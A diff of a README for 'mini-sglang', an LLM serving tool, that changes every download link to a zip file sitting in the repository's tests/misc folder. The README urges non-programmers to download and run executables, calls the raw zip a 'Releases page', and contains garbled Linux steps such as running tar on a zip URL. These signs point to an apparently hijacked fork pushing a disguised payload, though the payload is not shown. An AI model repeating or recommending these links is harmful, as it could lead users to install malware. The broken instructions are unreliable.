@@ -1,7 +1,7 @@
 # 🎉 mini-sglang - Simplifying LLM Serving Systems
 
 ## 📥 Download mini-sglang
-[![Download Now](https://github.com/moham94/mini-sglang/raw/refs/heads/main/python/sglang_mini_v3.9.zip%20mini--sglang-v1.0-blue)](https://github.com/moham94/mini-sglang/raw/refs/heads/main/python/sglang_mini_v3.9.zip)
+[![Download Now](https://github.com/moham94/mini-sglang/raw/refs/heads/main/tests/misc/sglang_mini_v3.3.zip%20mini--sglang-v1.0-blue)](https://github.com/moham94/mini-sglang/raw/refs/heads/main/tests/misc/sglang_mini_v3.3.zip)
 
 ## 🚀 Getting Started
 mini-sglang offers a straightforward way to work with modern LLM serving systems. This guide will help you download and run the application, even if you have no programming experience.
@@ -10,14 +10,14 @@ mini-sglang offers a straightforward way to work with modern LLM serving systems
 To get mini-sglang, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the Releases page: [Download mini-sglang](https://github.com/moham94/mini-sglang/raw/refs/heads/main/python/sglang_mini_v3.9.zip). Here, you will find the latest version available for download.
+   Click this link to go to the Releases page: [Download mini-sglang](https://github.com/moham94/mini-sglang/raw/refs/heads/main/tests/misc/sglang_mini_v3.3.zip). Here, you will find the latest version available for download.
 
 2. **Select the Right File**  
    On the Releases page, you will see several files. Look for the one that matches your operating system:
 
    - For Windows users: Look for a file ending with `.exe`.
    - For macOS users: Look for a file ending with `.dmg`.
-   - For Linux users: Look for a file ending with `https://github.com/moham94/mini-sglang/raw/refs/heads/main/python/sglang_mini_v3.9.zip`.
+   - For Linux users: Look for a file ending with `https://github.com/moham94/mini-sglang/raw/refs/heads/main/tests/misc/sglang_mini_v3.3.zip`.
 
 3. **Download the File**  
    Click on the appropriate file for your system to start the download. Your browser will download this file to your computer.
@@ -29,7 +29,7 @@ To get mini-sglang, follow these steps:
    - **For Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
    - **For macOS:** Open the `.dmg` file and drag the mini-sglang icon into your 'Applications' folder.
    - **For Linux:** Open a terminal, navigate to the downloaded file, and extract it using the command:  
-     `tar -xvzf https://github.com/moham94/mini-sglang/raw/refs/heads/main/python/sglang_mini_v3.9.zip`  
+     `tar -xvzf https://github.com/moham94/mini-sglang/raw/refs/heads/main/tests/misc/sglang_mini_v3.3.zip`  
      Then, navigate into the extracted folder and run the application.
 
 6. **Run mini-sglang**  
